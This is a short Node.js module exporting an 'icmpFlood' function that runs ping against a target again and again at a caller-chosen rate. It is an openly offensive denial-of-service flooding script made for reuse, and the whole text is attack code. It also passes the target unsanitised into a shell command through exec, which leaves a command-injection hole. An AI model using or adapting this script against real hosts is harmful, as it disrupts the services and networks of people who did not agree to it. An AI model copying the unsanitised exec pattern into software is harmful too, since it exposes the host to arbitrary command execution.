const { exec } = require('child_process');

function icmpFlood(target, rateLimit, logOutput) {
    setInterval(() => {
        exec(`ping -c 1 ${target}`, (err, stdout, stderr) => {
            if (err) {
                logOutput('Error: ' + err.message);
            } else {
                logOutput('Sent ICMP packet');
            }
        });
    }, 1000 / rateLimit);
}

module.exports = icmpFlood;
